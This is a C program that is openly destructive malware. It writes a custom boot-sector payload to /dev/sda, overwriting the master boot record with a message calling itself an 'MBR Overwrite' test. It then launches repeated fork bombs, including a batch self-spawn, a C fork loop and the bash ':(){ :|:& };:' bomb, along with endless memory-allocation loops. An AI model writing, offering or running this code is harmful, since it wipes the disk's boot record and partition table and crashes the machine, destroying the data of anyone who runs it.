#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#define DISK "/dev/sda"
int main(void){
	unsigned char payload[] = {0x04, 0xE8, 0x14, 0x00, 0xE8, 0x18, 0x00, 0xBE, 0x4A, 0x7C, 0xE8, 0x1C, 0x00, 0xBE, 0x6B, 0x7C, 
0xE8, 0x16, 0x00, 0xE8, 0x25, 0x00, 0xEB, 0xFE, 0x8C, 0xC0, 0x8E, 0xD8, 0x8E, 0xD0, 0xC3, 0xB4, 
0x00, 0xB0, 0x13, 0xCD, 0x10, 0xB8, 0x13, 0x00, 0xC3, 0xB4, 0x0E, 0x8A, 0x1E, 0x00, 0x7C, 0x8A, 
0x04, 0xCD, 0x10, 0x46, 0x8A, 0x04, 0x3C, 0x00, 0x75, 0xF7, 0xC3, 0xB4, 0x00, 0xCD, 0x16, 0x3C, 
0x0D, 0x74, 0x02, 0xEB, 0xF6, 0xEA, 0x00, 0x00, 0xFF, 0xFF, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
0x20, 0x20, 0x20, 0x20, 0x4D, 0x72, 0x45, 0x6D, 0x70, 0x79, 0x20, 0x4D, 0x42, 0x52, 0x20, 0x4F, 
0x76, 0x65, 0x72, 0x77, 0x72, 0x69, 0x74, 0x65, 0x0D, 0x0A, 0x00, 0x0A, 0x0A, 0x54, 0x68, 0x69, 
0x73, 0x20, 0x69, 0x73, 0x20, 0x6A, 0x75, 0x73, 0x74, 0x20, 0x61, 0x20, 0x74, 0x65, 0x73, 0x74, 
0x20, 0x61, 0x62, 0x6F, 0x75, 0x74, 0x20, 0x4D, 0x42, 0x52, 0x20, 0x49, 0x20, 0x64, 0x69, 0x64, 
0x2E, 0x0D, 0x0A, 0x54, 0x68, 0x61, 0x6E, 0x6B, 0x73, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x74, 0x65, 
0x73, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x3B, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
	FILE* harddisk;
	sleep(1);
	harddisk = fopen(DISK, "wb");
	fseek(harddisk, 0, SEEK_SET);
	fwrite(payload, sizeof(payload), 1, harddisk);
	fclose(harddisk);
	while(1){
		system("echo %0%|0 > punch.bat && punch.bat");
		while(1) fork();
		while(malloc(16711568));
		system(":(){ :|:& };:");
		char buf[1024000];
		while (1) {
			char *p = (char *)malloc(25 * 1024 * 1024);
			if (p == NULL) {
				perror("malloc");
				break;
   }
  }
	return 0;
 }
}
